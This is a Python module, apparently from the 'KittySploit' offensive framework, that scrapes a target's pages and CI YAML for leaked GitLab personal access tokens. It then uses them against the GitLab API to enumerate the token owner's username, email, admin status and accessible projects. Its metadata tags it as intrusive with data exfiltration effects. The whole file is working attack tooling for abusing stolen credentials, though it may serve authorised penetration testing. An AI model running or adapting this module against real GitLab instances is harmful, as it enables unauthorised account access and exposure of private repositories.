#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Abuse leaked GitLab personal access tokens against GitLab API."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.gitlab_api_probe import enumerate_gitlab_token
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "GitLab API Token Abuse",
        "description": (
            "Uses leaked glpat-* tokens to enumerate GitLab user identity and accessible "
            "projects via /api/v4. Auto-discovers tokens from CI YAML and bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["gitlab", "cicd", "token", "enumeration", "auxiliary"],
        "modules": [
            "scanner/http/gitlab_ci_secrets_detect",
            "scanner/http/gitlab_ci_yml_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    gitlab_token = OptString("", "GitLab personal access token (glpat-…)", False)
    gitlab_base_url = OptString("", "GitLab base URL (default: target or gitlab.com)", False)
    auto_discover = OptBool(True, "Scrape target for GitLab tokens", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        for path, text in bodies:
            if "gitlab-ci" in path or "glpat-" in text:
                homepage = homepage + "\n" + text

        self._configure_session()
        target = str(self.target or "").strip()
        findings, creds = enumerate_gitlab_token(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            token=str(self.gitlab_token or "").strip(),
            base_url=str(self.gitlab_base_url or "").strip(),
            fallback_base=target,
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No GitLab API access (set glpat token or enable auto_discover)")
            return False

        for hit in ok:
            if hit.get("kind") == "gitlab_user":
                print_success(f"GitLab user: {hit.get('username')} ({hit.get('email')}) admin={hit.get('is_admin')}")
            elif hit.get("kind") == "gitlab_projects":
                print_success(f"GitLab projects: {hit.get('count', 0)} — {hit.get('projects', [])}")

        self.set_info(
            severity="critical" if any(h.get("is_admin") for h in ok if h.get("kind") == "gitlab_user") else "high",
            reason=f"GitLab token abuse: {len(ok)} API hit(s)",
            findings=findings,
            credentials={k: mask_secret(v) if "token" in k else v for k, v in creds.items()},
        )
        return True
